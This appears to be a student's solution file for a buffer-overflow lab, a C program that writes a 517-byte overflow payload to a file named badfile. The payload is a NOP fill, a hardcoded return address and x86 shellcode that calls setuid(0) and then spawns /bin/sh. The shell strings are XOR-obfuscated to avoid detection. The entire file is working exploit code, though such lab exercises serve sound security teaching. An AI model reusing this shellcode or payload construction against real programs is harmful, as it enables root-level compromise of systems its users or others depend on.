/* exploit.c
 */
/* A program that creates a file containing code for launching shell*/
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
char shellcode[]=
"\x6a\x17"
"\x58"
"\x31\xdb"
"\xcd\x80"
"\x31\xc0"
"\x50"

// ascii hex
//"\x68""\x2f\x2f\x73\x68"
//"\x68""\x2f\x62\x69\x6e"

"\xb9\x91\x75\x32\x5a" // my ic number as XOR agent, put to ecx
"\xbb\xbe\x5a\x41\x32" // precalculated xored "pushl //sh", put to ebx
"\x31\xcb" // xor ebx ecx
"\x53" // push ebx to stack

"\xbb\xbe\x17\x5b\x34" // precalculated xored "push /bin", put into ebx
"\x31\xcb" // xor ebx ecx
"\x53"

"\x89\xe3"
"\x50"
"\x53"
"\x89\xe1"
"\x99"
"\xb0\x0b"
"\xcd\x80"
;

void main(int argc, char **argv)
{
	char buffer[517];
	FILE *badfile;

	/* Initialize buffer with 0x90 (NOP instruction) */
	memset(&buffer, 0x90, 517);
	
	/* You need to fill the buffer with appropriate contents here */
	/* ... */
	
	//char buffer_address[] = "\x54\xef\xff\xbf";
	char shellcode_address[] = "\x7c\xf0\xff\xbf";

	//long shellcode_address = 0xBFFFEFCF;
	//long retaddr;
	
	int i = 0;

	//char *ptr;
	//long *addrptr;
	//ptr = buffer;
	//addrptr = (long*)(ptr);

	//retaddr = get_sp() + 200;

	//for(i = 0; i < 10; i++) *(addrptr++) = retaddr;
	//char nopslide[24];
	//memset(&nopslide, 0x43, 24);
	//int j = 0;
	
	buffer[24] = shellcode_address[0];
	buffer[25] = shellcode_address[1];
	buffer[26] = shellcode_address[2];
	buffer[27] = shellcode_address[3];
	//buffer[28] = '\0';
	//for( i = 24; i < 28; i++){
	//	buffer[i] = shellcode_address[i-24];
	//}
	//for( i = 28; i < 40; i++) buffer[i] = '\0';
	/*for( i = 32; i < 64; i++){
		buffer[i] = shellcode[i-32];
	}*/
	
	int num = sizeof(buffer) - (sizeof(shellcode) + 1);

	for( i = 0; i < strlen(shellcode); i++){
		buffer[num+i] = shellcode[i];
	}

	buffer[sizeof(buffer) - 1] = '\0';

	/* Save the contents to the file "badfile" */
	badfile = fopen("./badfile", "w");
	fwrite(buffer, 517, 1, badfile);
	fclose(badfile);
}
